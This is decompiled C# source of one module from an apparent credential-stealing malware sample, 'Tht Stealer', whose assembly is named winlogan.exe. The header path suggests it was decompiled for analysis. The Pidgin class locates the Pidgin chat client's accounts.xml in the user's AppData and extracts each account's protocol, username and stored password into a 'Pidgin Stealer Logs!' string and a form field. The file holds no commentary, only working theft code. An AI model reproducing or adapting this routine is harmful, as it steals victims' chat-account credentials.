// Decompiled with JetBrains decompiler
// Type: Pidgin
// Assembly: winlogan.exe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 318DE2DF-1405-4E2E-8CC4-399298931BFA
// Assembly location: C:\Users\ZetSving\Desktop\На разбор Стиллеров\Tht Stealer\Tht Stealer\stub.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.IO;
using System.Xml;

[StandardModule]
internal sealed class Pidgin
{
  public static string GetPidgin()
  {
    XmlDocument xmlDocument = new XmlDocument();
    object Left = (object) null;
    string str1 = "";
    string str2 = Interaction.Environ("appdata") + "\\.purple\\accounts.xml";
    if (File.Exists(str2))
    {
      try
      {
        xmlDocument.Load(str2);
        XmlNodeList elementsByTagName1 = xmlDocument.GetElementsByTagName("protocol");
        XmlNodeList elementsByTagName2 = xmlDocument.GetElementsByTagName("name");
        XmlNodeList elementsByTagName3 = xmlDocument.GetElementsByTagName("password");
        int num1 = 0;
        int num2 = checked (elementsByTagName1.Count - 1);
        int index = num1;
        while (index <= num2)
        {
          Left = Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Left, (object) "Pidgin Stealer Logs!"), (object) "\r\n"), (object) "Protocol: "), (object) elementsByTagName1[index].InnerText), (object) "\r\n"), (object) "Username: "), (object) elementsByTagName2[index].InnerText), (object) "\r\n"), (object) "Password: "), (object) elementsByTagName3[index].InnerText), (object) "\r\n"), (object) "\r\n");
          checked { ++index; }
        }
        MyProject.Forms.Form1.paltalkt.Text = "Username: " + elementsByTagName2[index].InnerText + "\r\nPassword: " + elementsByTagName3[index].InnerText;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    return str1;
  }
}
